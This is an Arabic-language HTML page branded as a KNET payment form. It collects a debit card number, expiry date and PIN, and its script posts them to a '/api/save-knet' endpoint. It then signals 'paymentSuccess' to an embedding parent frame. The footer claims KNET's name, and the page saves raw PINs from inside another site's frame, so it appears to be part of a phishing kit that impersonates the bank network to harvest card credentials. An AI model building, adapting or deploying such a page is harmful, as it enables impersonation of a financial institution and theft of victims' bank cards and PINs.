<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="ar" dir="rtl">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
    <title>KNET Payment</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 10px;
            direction: rtl;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
        }
        .card-box {
            background: #fff;
            border: 1px solid #d1d5db;
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        .row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid #e5e7eb;
        }
        .row:last-child {
            border-bottom: none;
        }
        .label {
            color: #1e40af;
            font-weight: bold;
            font-size: 14px;
            width: 50%;
            text-align: right;
        }
        .input-container {
            width: 50%;
            display: flex;
            justify-content: flex-end;
        }
        input.payment-input {
            width: 100%;
            height: 35px;
            border: 1px solid #d1d5db;
            border-radius: 10px;
            padding: 0 10px;
            background-color: #f9fafb;
            text-align: right;
            font-size: 16px;
        }
        .expiry-box {
            background: #fff;
            border: 1px solid #d1d5db;
            border-radius: 10px;
            padding: 5px 15px;
            display: flex;
            align-items: center;
            direction: ltr;
        }
        .expiry-box input {
            width: 40px;
            border: none;
            text-align: center;
            font-size: 16px;
            outline: none;
        }
        .expiry-divider {
            margin: 0 5px;
            color: #9ca3af;
        }
        .button-box {
            background: #fff;
            border: 1px solid #d1d5db;
            border-radius: 20px;
            padding: 15px;
            display: flex;
            gap: 10px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        .btn {
            flex: 1;
            height: 45px;
            border: 1px solid #d1d5db;
            border-radius: 10px;
            background: #f3f4f6;
            color: #4b5563;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #4b5563;
            font-size: 12px;
            line-height: 1.8;
        }
        .footer a {
            color: #1e40af;
            text-decoration: none;
            display: block;
            font-weight: bold;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- قسم معلومات البطاقة فقط -->
        <div class="card-box">
            <div class="row">
                <div class="label">رقم بطاقة الصراف الآلي:</div>
                <div class="input-container">
                    <input type="text" class="payment-input" id="debitNumber" maxlength="19" placeholder="xxxx xxxx xxxx xxxx">
                </div>
            </div>
            <div class="row">
                <div class="label">تاريخ انتهاء البطاقة:</div>
                <div class="input-container">
                    <div class="expiry-box">
                        <input type="text" id="expYear" maxlength="2" placeholder="YY">
                        <span class="expiry-divider">/</span>
                        <input type="text" id="expMonth" maxlength="2" placeholder="MM">
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="label">الرقم السري (PIN):</div>
                <div class="input-container">
                    <input type="password" class="payment-input" id="cardPin" maxlength="4" style="width: 80px; text-align: center;">
                </div>
            </div>
        </div>

        <!-- أزرار التحكم -->
        <div class="button-box">
            <button class="btn" onclick="onCancel()">إلغاء</button>
            <button class="btn" onclick="onPay()">إرسال</button>
        </div>

        <!-- تذييل الصفحة -->
        <div class="footer">
            <div>جميع الحقوق محفوظة © 2026</div>
            <a href="#">شركة الخدمات المصرفية الآلية المشتركة - كي نت</a>
        </div>
    </div>

    <script>
        window.addEventListener('message', function(event) {
            if (event.data && event.data.type === 'submitKnet') {
                onPay();
            }
        });

        function onPay() {
            const debitNumber = document.getElementById('debitNumber').value;
            const expMonth = document.getElementById('expMonth').value;
            const expYear = document.getElementById('expYear').value;
            const cardPin = document.getElementById('cardPin').value;

            if(!debitNumber || !expMonth || !expYear || !cardPin) {
                alert("الرجاء إكمال كافة البيانات");
                return;
            }

            const data = {
                debitNumber: debitNumber,
                expiryMonth: expMonth,
                expiryYear: expYear,
                cardPin: cardPin
            };

            fetch('/api/save-knet', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                window.parent.postMessage({ type: 'paymentSuccess' }, '*');
            });
        }

        function onCancel() {
            window.parent.postMessage({ type: 'paymentCancel' }, '*');
        }

        // تنسيق رقم البطاقة
        document.getElementById('debitNumber').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
        });
    </script>
</body>
</html>
